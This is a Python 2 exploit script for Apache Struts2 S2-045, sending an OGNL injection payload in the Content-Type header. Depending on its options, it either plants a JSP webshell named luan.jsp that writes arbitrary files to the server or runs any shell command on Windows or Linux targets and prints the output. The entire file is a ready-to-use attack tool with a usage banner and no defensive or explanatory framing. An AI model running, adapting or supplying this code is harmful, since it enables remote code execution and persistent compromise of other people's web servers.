import urllib,urllib2,sys,ssl,getopt
def exp(url,payload):
    try:
        opener = urllib2.build_opener()
        urllib2.install_opener(opener)
        req = urllib2.Request(url)
        req.add_header('Content-Type',payload)
        return opener.open(req, "").read()
    except urllib2.URLError,e:
        return "fail"
    return "fail"
jspCode = "By<%if(request.getParameter(\\\"f\\\")!=null)(new java.io.FileOutputStream(application.getRealPath(\\\"/\\\")+request.getParameter(\\\"f\\\"))).write(request.getParameter(\\\"c\\\").getBytes());%>Luan"
print "S2-045 Exploit // Code By Luan Come Form St0rs Security Team"
opts, args = getopt.getopt(sys.argv[1:], "u:c:p:")
url,cmd,path = "","",""
for op, value in opts:
    if op == '-u':
        url = value
    elif op == '-c':
        cmd = value
    elif op == '-p':
        path = value
if url == "":
    print("Useage : exp.py -u url [-c cmd] [-p upfilePath]")
    sys.exit(0)
if cmd == "":
    if path == "":
        path = "#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')"
    else:
        path = "'" + path + "'"
    print "upload webshell ..."
    payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=" + path + ").(#shell='" + jspCode + "').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/luan.jsp').append(#shell)).close()).(#cmd='echo path:'+#path).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
else:
    print "run " + cmd + " ..."
    payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
result = exp(url,payload)
if result == "fail":
    print "Exploit Fail"
else:
    print result